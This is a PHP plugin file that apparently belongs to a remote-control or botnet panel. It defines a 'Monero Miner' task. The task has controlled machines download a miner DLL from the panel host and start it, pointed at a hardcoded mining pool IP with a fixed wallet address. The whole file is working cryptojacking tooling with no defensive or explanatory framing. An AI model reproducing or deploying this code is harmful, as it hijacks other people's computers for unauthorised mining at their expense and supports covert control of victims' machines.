<?php


$pluginName = "miner";

$GLOBALS["foundPlugins"][$pluginName]["plugindir"] = __DIR__;
require __DIR__."/Controller/miner.class.php";

register_navigation_tab($pluginName,get_plugin_include_dir($pluginName)."assets/nav/about.svg");

$router->all('/miner', 'miner@settings');

$host = "http://".$_SERVER["HTTP_HOST"];

$minerArgs = "-a cryptonight --url=185.234.72.253:3333 --donate-level=1 --user=4A4a56cxpXHKUD8AwkeKT86TpxGp9t8UvDm1ZT1Md8dNjemAFUDtg7F5Cvoc2obZdfaLs9ez5SNrPA5SMhKXMvtfCWR2MCz --threads=1";
$GLOBALS["task_configuration"]["miner"] = array(
    "name" => "Monero Miner",
    "command" => "runplugin",
    "value" => $host."/versions/".$GLOBALS["loadedVersion"]."/plugins/".$pluginName."/dll/Monero_cpu.dll;StartMiner;".$minerArgs
);
